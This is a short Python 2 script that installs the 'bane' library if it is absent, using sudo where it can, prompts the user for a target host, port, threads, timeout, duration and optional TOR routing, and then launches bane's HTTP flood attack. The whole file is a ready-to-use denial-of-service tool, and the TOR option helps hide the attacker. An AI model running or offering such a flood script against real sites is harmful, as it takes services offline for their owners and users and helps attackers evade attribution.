import os,sys
try:
 import bane
except:
 print"Failed to import a module.\nLet me install it for you.. (if you are using linux you have to execute it as root to install the required module)"
 if os.path.isdir('/home')==True:
  os.system('sudo pip install bane')
 else:
  os.system('pip install bane')
import socket
n=0
while(n<1):
 try:
  u=raw_input('\nTarget Domain/IP: (www.google.com)\n> ')
  socket.gethostbyname(u)
  n+=1
 except:
  pass
while(n<2):
 try:
  p=input('Port:\n>')
  n+=1
 except:
  pass
while(n<3):
 try:
  th=input('Threads:\n>')
  n+=1
 except:
  pass
while(n<4):
 try:
  ti=input('Timeout:\n>')
  n+=1
 except:
  pass
while(n<5):
 try:
  d=input('Attack\'s duration (in seconds):\n>')
  n+=1
 except:
  pass
while(n<6):
 try:
  tr=input('Use TOR?\n 1-Yes\n 2-No\n>')
  n+=1
 except:
  pass
to=False
if tr==1:
 to=True
try:
 bane.http_flood_attack(u,p=p,maxtime=ti,threads=th,duration=d,level=2,settor=to)
except KeyboardInterrupt:
 bane.ddos.stop=True

